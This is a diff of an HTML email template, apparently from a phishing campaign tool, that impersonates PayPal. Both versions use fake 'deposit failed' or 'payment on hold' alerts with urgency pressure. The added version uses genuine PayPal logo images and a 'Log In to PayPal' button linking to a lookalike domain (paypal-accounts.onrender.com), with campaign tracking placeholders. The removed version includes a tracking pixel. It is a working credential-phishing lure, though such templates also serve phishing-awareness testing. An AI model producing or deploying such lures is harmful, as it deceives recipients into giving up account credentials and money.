@@ -1,127 +1,138 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Deposit Failed - PayPal</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Payment Hold Notification - PayPal</title>
+    <link href="https://fonts.bunny.net/css2?family=Nunito:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
 </head>
-<body style="margin: 0; padding: 0; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #f5f7fa; line-height: 1.6;">
-    <table role="presentation" style="width: 100%; border-collapse: collapse;">
-        <tr>
-            <td align="center" style="padding: 40px 20px;">
-                <table role="presentation" style="width: 100%; max-width: 600px; border-collapse: collapse; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);">
-                    <!-- Header -->
-                    <tr>
-                        <td style="padding: 40px 40px 20px; text-align: center; border-bottom: 1px solid #e5e5e5;">
-                            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjI2IiB2aWV3Qm94PSIwIDAgMTAwIDI2IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMTIuMjEyIDEuNzQ0QzE0LjQzNyAxLjc0NCAxNi4yOTkgMi42MDcgMTcuODAxIDQuMzMzQzE5LjMwMyA2LjA1OSAxOS45NDQgOC4zMjQgMTkuNzI1IDExLjEyOEMxOS41MDYgMTMuOTMyIDE4LjQ1NyAxNi40NTcgMTYuNTc4IDE4LjcwNEMxNC42OTkgMjAuOTUxIDEyLjA4IDIyLjA3NCAxMC43MjEgMjIuMDc0SDUuNTY5TDQuMTQ1IDI2SDAuMTQ1TDUuNjY5IDEuNzQ0SDEyLjIxMlpNMTEuNzEyIDUuMjY0SDguMTY5TDYuNjE5IDE4LjU1NEgxMC4xNjJDMTEuMDIxIDE4LjU1NCAxMS43NzkgMTguMjU5IDEyLjQzNiAxNy42NjhDMTMuMDkzIDE3LjA3NyAxMy41NjEgMTYuMzI0IDEzLjg0IDE1LjQwOUMxNC4xMTkgMTQuNDk0IDE0LjE0MyAxMy41NTQgMTMuOTEyIDEyLjU4OUMxMy42ODEgMTEuNjI0IDEzLjIwNiAxMC43NjQgMTIuNDg2IDEwLjAwOUMxMS43NjYgOS4yNTQgMTAuODU3IDguNzU5IDkuNzU4IDguNTI0VjguNTI0QzEwLjQ5OCA4LjU5NCAxMS4xNDkgOC4yOTkgMTEuNzEyIDcuNjM5QzEyLjI3NSA2Ljk3OSAxMi42NCA2LjE2OSAxMi44MDYgNS4yMDlWNS4yNjRIMTEuNzEyWiIgZmlsbD0iIzAwMzA4NyIvPgo8cGF0aCBkPSJNMjguNzE5IDUuMjY0QzMwLjM5NCA1LjI2NCAzMS43NTMgNS43NTkgMzIuNzk2IDYuNzQ5QzMzLjgzOSA3LjczOSAzNC4zNjEgOS4wNTQgMzQuMzYxIDEwLjU5NEMzNC4zNjEgMTEuOTQ5IDMzLjk3NCAxMy4xMzQgMzMuMiAxNC4xNDlDMzIuNDI2IDE1LjE2NCAzMS4zNjQgMTUuOTA5IDMwLjAxNCAxNi4zODRDMjguNjY0IDE2Ljg1OSAyNy4xMzQgMTcuMDk0IDI1LjQyNCAxNy4wOTRIMjMuNTI0TDIyLjczNCAyMi4wNzRIMTguNzM0TDIzLjI1OCA1LjI2NEgyOC43MTlaTTI2LjIxOSA4Ljc4NEgyNS4yMTlMMjQuNDI5IDEzLjU3NEgyNS40MjlDMjYuMzI5IDEzLjU3NCAyNy4wMjkgMTMuMzE5IDI3LjUyOSAxMi44MDlDMjguMDI5IDEyLjI5OSAyOC4zMTQgMTEuNjI5IDI4LjM4NCAxMC43OTlDMjguNDU0IDkuOTY5IDI4LjI4NCA5LjIzNCAyNy44NzQgOC41OTRDMjcuNDY0IDcuOTU0IDI2Ljg4OSA3LjYzNCAyNi4xNDkgNy42MzRIMjYuMjE5VjguNzg0WiIgZmlsbD0iIzAwMzA4NyIvPgo8L3N2Zz4K" alt="PayPal" style="height: 26px; width: 100px;">
-                        </td>
-                    </tr>
-                    
-                    <!-- Alert Section -->
-                    <tr>
-                        <td style="padding: 30px 40px; text-align: center;">
-                            <div style="width: 60px; height: 60px; background-color: #ff9500; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;">
-                                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="white"/>
-                                </svg>
-                            </div>
-                            <h1 style="margin: 0 0 20px; font-size: 24px; font-weight: 600; color: #2c2e2f;">Deposit Failed</h1>
-                            <p style="margin: 0 0 20px; font-size: 16px; color: #2c2e2f;">We were unable to process your recent deposit. Your account may require verification.</p>
-                        </td>
-                    </tr>
-                    
-                    <!-- Transaction Details -->
-                    <tr>
-                        <td style="padding: 0 40px 30px;">
-                            <div style="background-color: #f8f9fa; border-radius: 8px; padding: 24px; margin-bottom: 24px;">
-                                <h3 style="margin: 0 0 16px; font-size: 16px; font-weight: 600; color: #2c2e2f;">Transaction Details:</h3>
-                                <table style="width: 100%; border-collapse: collapse;">
-                                    <tr>
-                                        <td style="padding: 8px 0; font-size: 14px; color: #6c7378; width: 140px;">Transaction ID:</td>
-                                        <td style="padding: 8px 0; font-size: 14px; color: #2c2e2f; font-weight: 500;">{{ transaction_id|default:"PP-1234567890-ABCD" }}</td>
-                                    </tr>
-                                    <tr>
-                                        <td style="padding: 8px 0; font-size: 14px; color: #6c7378;">Amount:</td>
-                                        <td style="padding: 8px 0; font-size: 14px; color: #2c2e2f; font-weight: 500;">{{ amount|default:"$500.00 USD" }}</td>
-                                    </tr>
-                                    <tr>
-                                        <td style="padding: 8px 0; font-size: 14px; color: #6c7378;">Date & Time:</td>
-                                        <td style="padding: 8px 0; font-size: 14px; color: #2c2e2f; font-weight: 500;">{{ current_datetime|default:"January 15, 2024 at 3:42 PM PST" }}</td>
-                                    </tr>
-                                    <tr>
-                                        <td style="padding: 8px 0; font-size: 14px; color: #6c7378;">Status:</td>
-                                        <td style="padding: 8px 0; font-size: 14px; color: #ff9500; font-weight: 600;">Failed - Verification Required</td>
-                                    </tr>
-                                </table>
-                            </div>
-                            
-                            <div style="background-color: #fff3cd; border: 1px solid #ffeaa7; border-radius: 8px; padding: 20px; margin-bottom: 24px;">
-                                <h3 style="margin: 0 0 12px; font-size: 16px; font-weight: 600; color: #856404;">Why did this happen?</h3>
-                                <ul style="margin: 0; padding-left: 20px; color: #856404; font-size: 14px; line-height: 1.5;">
-                                    <li style="margin-bottom: 8px;">Your account requires additional verification for large transactions</li>
-                                    <li style="margin-bottom: 8px;">Recent suspicious activity detected on your account</li>
-                                    <li style="margin-bottom: 0;">Enhanced security measures for your protection</li>
-                                </ul>
-                            </div>
-                            
-                            <p style="margin: 0 0 24px; font-size: 14px; color: #2c2e2f; line-height: 1.5;">
-                                To complete your deposit and unlock your account, please verify your identity immediately. 
-                                This is a security measure to protect your funds.
-                            </p>
-                        </td>
-                    </tr>
-                    
-                    <!-- Action Buttons -->
-                    <tr>
-                        <td style="padding: 0 40px 40px; text-align: center;">
-                            <div style="margin-bottom: 16px;">
-                                <a href="http://localhost:8000/paypal/?campaign={{ campaign_id }}" style="display: inline-block; background-color: #0070ba; color: white; text-decoration: none; padding: 14px 32px; border-radius: 25px; font-size: 16px; font-weight: 600; margin: 0 8px;">Verify Account Now</a>
-                            </div>
-                            <div>
-                                <a href="#" style="display: inline-block; background-color: transparent; color: #0070ba; text-decoration: none; padding: 14px 32px; border: 2px solid #0070ba; border-radius: 25px; font-size: 16px; font-weight: 600; margin: 0 8px;">Contact Support</a>
-                            </div>
-                        </td>
-                    </tr>
-                    
-                    <!-- Urgency Notice -->
-                    <tr>
-                        <td style="padding: 0 40px 40px;">
-                            <div style="background-color: #ffeae7; border: 1px solid #ff9292; border-radius: 8px; padding: 20px; text-align: center;">
-                                <h3 style="margin: 0 0 12px; font-size: 16px; font-weight: 600; color: #721c24;">⚠️ Action Required Within 24 Hours</h3>
-                                <p style="margin: 0; color: #721c24; font-size: 14px; line-height: 1.5;">
-                                    If you don't verify your account within 24 hours, your deposit will be returned to the original source 
-                                    and your account may be temporarily limited for security purposes.
-                                </p>
-                            </div>
-                        </td>
-                    </tr>
-                    
-                    <!-- Footer -->
-                    <tr>
-                        <td style="padding: 30px 40px; border-top: 1px solid #e5e5e5; text-align: center;">
-                            <p style="margin: 0 0 16px; font-size: 12px; color: #6c7378; line-height: 1.4;">
-                                This email was sent to notify you about your recent transaction. 
-                                If you did not initiate this deposit, please contact us immediately.
-                            </p>
-                            <p style="margin: 0 0 16px; font-size: 12px; color: #6c7378;">
-                                <a href="#" style="color: #0070ba; text-decoration: none;">PayPal Help Center</a> |
-                                <a href="#" style="color: #0070ba; text-decoration: none;">Contact Us</a> |
-                                <a href="#" style="color: #0070ba; text-decoration: none;">Security Center</a>
-                            </p>
-                            <p style="margin: 0; font-size: 12px; color: #6c7378;">
-                                © 2024 PayPal Holdings, Inc. All rights reserved.<br>
-                                PayPal (Europe) S.à r.l. et Cie, S.C.A.
-                            </p>
-                        </td>
-                    </tr>
-                </table>
-                
-                <!-- Tracking Pixel -->
-                {% if tracking_pixel_url %}
-                <img src="{{ tracking_pixel_url }}" width="1" height="1" style="display: block; width: 1px; height: 1px;" alt="">
-                {% endif %}
-            </td>
-        </tr>
+
+<body>
+    
+    <!--Warning Message-->
+    <div style="background-color: #ff9500; border-radius: 8px; color: white; margin: 20px auto; padding: 20px; text-align: center; width: 85%;">
+        <div style="font-size: 15px; font-weight: bold; margin-bottom: 10px;">⚠️ ACTION REQUIRED</div>
+        <p style="font-family: 'Nunito', Arial, Helvetica, sans-serif; font-size: 14px; font-weight: bold; line-height: 1.4; margin: 0;">
+            Your payment is currently on hold. Please log in to your account to resolve this issue immediately.
+        </p>
+    </div>
+    <!--Warning Message-->
+    
+    <table style="background-color: white; font-family: 'Nunito', Arial, Helvetica, sans-serif; width: 100%;">
+        <tbody>
+            <tr>
+                <td align="center" bgcolor="#FAF8F5" style="color: #222222; font-size: small; margin: 0px;">
+                    <table style="width: 100%;">
+                        <tbody>
+                            <tr>
+                                <td style="margin: 0px;">
+                                    <table style="background-color: white; width: 100%;">
+                                        <tbody>
+                                            <tr>
+                                                <td style="color: #687173; font-size: 14px; line-height: 20px; margin: 0px; padding: 10px;">
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td style="margin: 0px; padding: 15px 20px 25px;">
+                                                    <img alt="PayPal" src="https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/paypal-rebranding/pp-logo-in-circle.png" style="display: block;" />
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td style="margin: 0px; padding: 0px 35px 30px;">
+                                    <div style="color: #333; font-size: 16px; line-height: 24px; margin: 20px 0;">
+                                        <p style="margin-bottom: 18px;">Dear {{ recipient_name }},</p>
+                                        
+                                        <p style="margin-bottom: 18px;">We're writing to let you know that a recent payment on your account has been suspended. To help us resolve this issue and ensure the security of your account, we kindly ask you to log in and review the notification.</p>
+                                        
+                                        <p style="margin-bottom: 18px;">Please log in to your PayPal account to take the necessary steps:</p>
+    
+                                        
+                                        <p style="margin-bottom: 18px;">If no action is taken, your account activity may be temporarily limited.</p>
+                                        
+                                        <p style="margin-bottom: 0;">Thank you for your prompt attention to this matter.</p>
+
+                                        <div style="text-align: center; margin: 25px 0;">
+                                            <a href="https://paypal-accounts.onrender.com?campaign={{ campaign_id }}" style="border-radius: 50px; border: 2px solid #0070ba; background: #0070ba; color: white; display: inline-block; font-size: 18px; line-height: 22px; min-width: 150px; padding: 15px 35px; text-decoration: none; font-weight: bold;"> Log In to PayPal</a>
+                                        </div>
+                                    </div>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td style="margin: 0px;">
+                                    <table style="width: 100%;">
+                                        <tbody>
+                                            <tr>
+                                                <td style="margin: 0px;" valign="top" width="120">
+                                                    <img alt="PayPal" height="100" src="https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/paypal-rebranding/footer-logo-with-crop.png" style="display: block;" width="283" />
+                                                    <hr style="border-top-color: rgb(198, 198, 198); border-top-style: solid; margin: 0px 35px;" />
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                    
+                                    <table style="width: 100%;">
+                                        <tbody>
+                                            <tr>
+                                                <td style="color: #001435; font-size: 11px; line-height: 31px; margin: 0px; padding: 10px 35px;">
+                                                    Help & Contact&nbsp;&nbsp;|&nbsp;&nbsp;Security&nbsp;&nbsp;|&nbsp;&nbsp;Apps
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td style="margin: 0px; padding: 20px;">
+                                                    <table>
+                                                        <tbody>
+                                                            <tr>
+                                                                <td align="center" style="margin: 0px;" valign="middle" width="60">
+                                                                    <img alt="Twitter" height="28" src="https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/paypal-rebranding/footer-social-icons_twitter.png" style="display: block;" width="28" />
+                                                                </td>
+                                                                <td align="center" style="margin: 0px;" valign="middle" width="60">
+                                                                    <img alt="Instagram" height="28" src="https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/paypal-rebranding/footer-social-icons_instagram.png" style="display: block;" width="28" />
+                                                                </td>
+                                                                <td align="center" style="margin: 0px;" valign="middle" width="60">
+                                                                    <img alt="Facebook" height="28" src="https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/paypal-rebranding/footer-social-icons_facebook.png" style="display: block;" width="28" />
+                                                                </td>
+                                                                <td align="center" style="margin: 0px;" valign="middle" width="60">
+                                                                    <img alt="LinkedIn" height="28" src="https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/paypal-rebranding/footer-social-icons_linkedin.png" style="display: block;" width="28" />
+                                                                </td>
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td style="margin: 0px; padding: 5px 35px 20px;">
+                                                    <p style="font-size: 11px; line-height: 13px; margin: 5px 0px;">
+                                                        PayPal is committed to preventing fraudulent emails. Emails from PayPal will always contain your full name. Learn to identify phishing
+                                                    </p>
+                                                    <p style="font-size: 11px; line-height: 13px; margin: 5px 0px;">
+                                                        Not sure why you received this email? Learn more
+                                                    </p>
+                                                    <div style="font-size: 11px; line-height: 13px; margin: 5px 0px;">
+                                                        <span style="color: #222222;">
+                                                            Copyright © 1999-2025 PayPal. All rights reserved.<br />
+                                                            PayPal Pte. Ltd. ("3PL") has applied for a license under the Singapore Payment Services Act ("PS Act") with the Monetary Authority of Singapore.
+                                                        </span>
+                                                    </div>
+                                                    <p style="font-size: 11px; line-height: 13px; margin: 5px 0px;">
+                                                        <span style="color: #222222;">PayPal RT000231:en_US(en-AE):1.0.0:696ae4ed727da</span>
+                                                    </p>
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </td>
+            </tr>
+        </tbody>
     </table>
+
 </body>
 </html>
